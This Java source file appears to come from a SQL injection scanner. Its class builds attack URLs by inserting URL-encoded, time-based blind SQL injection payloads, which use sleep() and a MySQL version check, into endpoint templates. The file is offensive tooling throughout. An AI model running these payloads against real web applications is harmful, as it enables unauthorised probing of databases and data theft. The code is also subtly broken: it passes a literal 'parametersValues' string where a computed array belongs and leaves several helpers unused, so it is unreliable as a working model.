package util;

import org.apache.commons.lang3.StringUtils;

import java.io.*;
import java.net.URLEncoder;
import java.util.ArrayList;
import java.util.List;

public class PayloadUtil {

    public ArrayList<String> payloads = new ArrayList<>();

    public PayloadUtil() {
        payloads.add("test' and if(version() like '5%%',sleep(%d),'false');#");
        payloads.add("test' and sleep(%d);#");
//        payloads.add("test' and sleep(%d)");
    }

    public ArrayList<String> injectPayloads(ArrayList<String> epWithParameters, ArrayList<String> payloads, int delay) throws UnsupportedEncodingException {
        ArrayList<String> result = new ArrayList<>();
        PayloadUtil payloadUtil = new PayloadUtil();
        for (String s : epWithParameters) {
            int specifierOccurence = this.countNumberOfStringSpecifierOccurence(s);
            Object[] parametersValues = this.createStringArray(specifierOccurence);
            for (String payload : payloads) {
                result.add(String.format(s,URLEncoder.encode(this.formatPayload(payload,delay),"UTF-8"),"parametersValues"));
            }
        }
        return result;
    }

    private int countNumberOfStringSpecifierOccurence(String ep){
        return StringUtils.countMatches(ep, "%s");
    }

    private Object[] createStringArray(int numberOfElements){
        List<String> result = new ArrayList<>();

        for (int i = 0; i < numberOfElements-1; i++) {
            result.add(" ");
        }
//        String[] arrayResult = result.toArray(new String[0]);
        return result.stream().toArray();
    }

    private String formatPayload(String payload, int version, int sleepTime) {
        return String.format(payload, version, sleepTime);
    }

    private String formatPayload(String payload, int sleepTime) {
        return String.format(payload, sleepTime);
    }

    public ArrayList<String> getPayloads() {
        return payloads;
    }
}
